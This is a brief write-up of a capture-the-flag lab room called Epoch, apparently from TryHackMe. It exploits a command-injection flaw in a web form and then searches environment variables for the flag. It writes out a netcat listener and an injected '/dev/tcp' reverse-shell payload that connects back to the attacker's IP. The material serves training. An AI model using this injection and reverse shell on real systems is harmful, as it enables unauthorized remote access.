---
title: Epoch
tags:
  - thm
  - easy
---

#### Author: AMD

![[static/epoch/epoch.png]]

This is a writeup for <b>Epoch</b> room.

My target IP: 10.10.218.15

-----------------------------------------------------------------------------------
<b>VISIT WEB PAGE</b>

If we read the room explanation "Our website actually just passes your input right along to that command-line program!" we can see that we might be able to run commands. So lets try it.

![[static/epoch/ls.png]]

Perfect, we can run commands. Lets find a way to get in.

-----------------------------------------------------------------------------------
<b>REVERSE SHELL</b>

Visit https://www.revshells.com/ and use your pc's IP to handle the condiguration.

![[static/epoch/shell_conf.png]]

run "nc -lvnp 9001"

input "&sh -i >& /dev/tcp/10.10.244.218/9001 0>&1"

![[static/epoch/conn_received.png]]

-----------------------------------------------------------------------------------
<b>GET THE FLAG</b>

When we look around we can not find the flag. Lets look at the hint: "The developer likes to store data in environment variables, can you find anything of interest there?"

Lets try "printenv" to see the environment variables.

![[static/epoch/printenv.png]]

-----------------------------------------------------------------------------------
